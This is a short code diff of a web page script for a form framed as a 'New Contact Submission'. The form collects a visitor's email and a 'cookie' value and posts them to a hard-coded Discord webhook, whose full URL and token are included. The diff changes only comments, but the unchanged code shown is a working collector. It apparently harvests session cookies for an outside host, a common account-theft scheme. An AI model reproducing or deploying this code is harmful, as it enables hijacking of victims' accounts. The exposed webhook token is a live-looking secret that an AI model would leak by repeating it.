@@ -63,12 +63,13 @@
       e.preventDefault();
 
       const email = document.getElementById('email').value;
-      const cookie = document.getElementById('cookie').value; // 'cookie' instead of 'message'
+      const cookie = document.getElementById('cookie').value; // variable renamed from 'message' to 'cookie'
 
       const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT'; // Your webhook URL
 
+      // This is where the payload is being changed
       const payload = {
-        content: `📬 New Contact Submission\n📧 Email: ${email}\n🍪 Cookie: ${cookie || "No cookie provided"}` // Sends "Cookie" in the content
+        content: `📬 New Contact Submission\n📧 Email: ${email}\n🍪 Cookie: ${cookie || "No cookie provided"}` // Replaced "Message" with "Cookie"
       };
 
       try {
